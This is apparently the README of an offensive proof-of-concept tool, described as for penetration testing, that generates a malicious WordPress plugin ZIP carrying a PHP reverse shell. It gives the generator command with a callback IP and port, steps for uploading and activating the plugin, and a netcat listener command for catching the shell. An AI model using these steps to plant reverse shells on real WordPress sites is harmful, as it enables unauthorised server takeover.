# MalWordPlugin

MalWordPlugin is a proof-of-concept (PoC) tool that generates a malicious WordPress plugin packaged as a ZIP file. This plugin can be used for penetration testing, demonstrating potential security vulnerabilities in WordPress environments.

The project is inspired by the malicious-wordpress-plugin repository by wetw0rk and incorporates a PHP reverse shell from PentestMonkey. Additionally, insights gained from a cybersecurity certification were applied to extend and modify the original concept.

## Features

* Plugin Generator: Automatically creates a ZIP file containing a custom malicious WordPress plugin.
* Customizable Payload: Modify the pluginâ€™s behavior and payload to suit different penetration testing scenarios. I used the PHP Reverseshell from PentestMonkey as example.
* Ready-to-Deploy: The generated ZIP file can be directly uploaded and activated in a WordPress installation.

## Installation
### Prerequisites

* Python 3.12.*
* Basic understanding of WordPress plugins and their deployment

### Steps

1. Clone the repository:

```bash
git clone https://github.com/username/malwordplugin.git
cd malwordplugin
```

2. Run the tool to generate the ZIP file:

```bash
python3 malwordplugin.py -d 192.168.1.1 -p 4242 
```

3. The ZIP file will be created in the project directory (e.g., malicious.zip).

## Usage

1. Upload the generated ZIP file to a WordPress installation via the admin panel (Plugins > Add New > Upload Plugin).
2. Activate the plugin.
3. Start a listener on your attack machine (e.g., using netcat):
```bash
nc -lvnp <port>
```
4. Trigger the plugin to initiate the reverse shell connection. (The generator tells you the url templates)

## Technologies Used

* Python: Core logic for generating the WordPress plugin.
* PHP: Payload execution, including reverse shell functionality.
* WordPress: Target platform for plugin deployment.
